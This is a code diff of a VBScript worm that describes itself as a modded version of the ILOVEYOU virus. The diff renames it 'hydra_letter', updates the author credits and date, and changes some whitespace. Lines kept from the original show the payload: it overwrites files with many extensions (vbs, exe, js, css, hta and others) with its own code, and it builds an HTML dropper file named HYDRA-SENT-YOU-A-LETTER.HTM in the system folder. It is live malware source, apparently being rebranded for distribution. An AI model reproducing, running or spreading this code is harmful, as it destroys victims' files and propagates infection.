@@ -1,4 +1,4 @@
-rem  barok -hydraletter(vbe) <uwu>
+rem  master7720 -hydra_letter(vbe) <cool things>
 rem by: master7720  /  master7720@mail.com  /  @imperial Group  /  LA
 On Error Resume Next
 dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
@@ -90,7 +90,7 @@ if (ext="vbs") or (ext="vbe") then
 set ap=fso.OpenTextFile(f1.path,2,true)
 ap.write vbscopy
 ap.close
-elseif(ext="exe") or (ext="com") or (ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
+elseif(ext="exe") or (ext="com") or (ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then 
 set ap=fso.OpenTextFile(f1.path,2,true)
 ap.write vbscopy
 ap.close
@@ -207,10 +207,10 @@ end sub
 sub html
 On Error Resume Next
 dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
-dta1="<HTML><HEAD><TITLE>HYDRALETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS -
-HYDRALETTER@-@>"&vbcrlf& _ "<META NAME=@-@Author@-@ CONTENT=@-@master7720 ?-? master7720@mail.com ?-?
-@imperial Group ?-? LA ?-? March 2000@-@>"&vbcrlf& _ "<META NAME=@-@Description@-@
-CONTENT=@-@simple but i think this its good...@-@>"&vbcrlf& _
+dta1="<HTML><HEAD><TITLE>HYDRA_LETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS -
+HYDRA_LETTER@-@>"&vbcrlf& _ "<META NAME=@-@Author@-@ CONTENT=@-@master7720 ?-? master7720@mail.com ?-?
+  @imperial Group ?-? LA ?-? november 2021-@>"&vbcrlf& _ "<META NAME=@-@Description@-@
+  CONTENT=@-@modded version of a simple virus called ILOVEYOU...@-@>"&vbcrlf& _
 "<?-?HEAD><BODY
 ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#HYDRA-SENT-YOU-A-LETTER.
 HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
@@ -267,9 +267,9 @@ else
 lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _" end if
 next
 set b=fso.CreateTextFile(dirsystem+"\HYDRA-SENT-YOU-A-LETTER.HTM") b.close
-set d=fso.OpenTextFile(dirsystem+"\HYDRA-SENT-YOU-A-LETTER.HTM", 2) d.write dt5
+set d=fso.OpenTextFile(dirsystem+"\HYDRA-SENT-YOU-A-LETTER.HTM",2) d.write dt5
 d.write join(lines,vbcrlf)
 d.write vbcrlf
 d.write dt6
 d.close
-end sub 
+end sub
